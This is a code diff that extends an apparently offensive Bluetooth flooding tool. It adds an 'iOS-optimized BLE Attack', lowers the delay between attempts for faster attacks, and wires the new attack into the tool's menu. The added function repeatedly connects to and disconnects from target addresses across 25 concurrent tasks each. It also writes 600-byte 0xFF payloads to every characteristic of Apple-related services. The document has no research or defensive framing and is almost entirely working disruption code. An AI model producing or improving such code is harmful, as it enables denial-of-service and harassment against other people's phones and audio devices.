@@ -13,7 +13,16 @@ import asyncio
 # Settings
 packagesSize = 600
 threadsCount = 25  # Reduced for Raspberry Pi
-myDelay = 0.1     # Increased delay
+myDelay = 0.05  # Reduced delay for faster attacks
+MAX_RETRIES = 3
+
+# iOS specific service UUIDs
+IOS_SERVICES = [
+    "180A",  # Device Information
+    "180F",  # Battery Service
+    "1812",  # HID Service
+    "FE9F"   # Apple Continuity
+]
 
 def check_prerequisites():
     if os.geteuid() != 0:
@@ -65,6 +74,34 @@ async def ble_flood_attack(target_addr):
             pass
         await asyncio.sleep(myDelay)
 
+async def ios_ble_attack(target_addr):
+    while True:
+        for _ in range(MAX_RETRIES):
+            try:
+                async with BleakClient(target_addr, timeout=1.0) as client:
+                    # Aggressive connection/disconnection cycle
+                    await client.connect(timeout=1.0)
+                    await asyncio.sleep(0.1)
+                    await client.disconnect()
+                    
+                    # Try to write to all possible characteristics
+                    services = await client.get_services()
+                    for service in services:
+                        if any(uuid in service.uuid for uuid in IOS_SERVICES):
+                            for char in service.characteristics:
+                                try:
+                                    await client.write_gatt_char(
+                                        char.uuid,
+                                        bytearray([0xFF] * packagesSize),
+                                        response=False
+                                    )
+                                except:
+                                    continue
+            except:
+                await asyncio.sleep(0.1)
+                continue
+        await asyncio.sleep(myDelay)
+
 async def main():
     check_prerequisites()
     
@@ -107,6 +144,7 @@ async def main():
     print("\nSelect attack method:")
     print("1: L2CAP Ping Flood (for linux only/needs root/use when device is already playing music)")
     print("2: BLE Connection Flood (for all devices/needs root/use when device is idle)")
+    print("3: iOS-optimized BLE Attack")
     method = int(input("Method: "))
 
     print(f"\nStarting attack on {', '.join(target_addresses)}...")
@@ -126,10 +164,15 @@ async def main():
             # Keep main thread alive
             while True:
                 time.sleep(1)
-        else:
+        elif method == 2:
             all_attacks = []
             for addr in target_addresses:
                 all_attacks.extend([ble_flood_attack(addr) for _ in range(threadsCount)])
+            await asyncio.gather(*all_attacks)
+        elif method == 3:
+            all_attacks = []
+            for addr in target_addresses:
+                all_attacks.extend([ios_ble_attack(addr) for _ in range(threadsCount)])
             await asyncio.gather(*all_attacks)
 
     except KeyboardInterrupt:
